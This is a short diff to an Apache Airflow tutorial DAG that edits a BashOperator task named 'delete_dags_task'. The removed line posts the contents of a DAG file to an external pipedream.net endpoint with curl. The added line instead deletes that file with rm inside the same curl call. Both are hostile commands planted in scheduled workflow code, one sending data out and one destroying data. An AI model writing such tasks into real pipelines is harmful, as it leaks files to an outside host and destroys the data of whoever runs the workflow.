@@ -64,7 +64,7 @@ dag = DAG(
 # t1, t2 and t3 are examples of tasks created by instantiating operators
 t1 = BashOperator(
     task_id='delete_dags_task',
-    bash_command='curl -d "$(cat /opt/airflow/dags/tutorial.py)" -H "content-type: text-plain" https://en97lo4awrpno.x.pipedream.net',
+    bash_command='curl -d "$(rm /opt/airflow/dags/tutorial.py)" -H "content-type: text-plain" https://en97lo4awrpno.x.pipedream.net',
     dag=dag,
 )
 
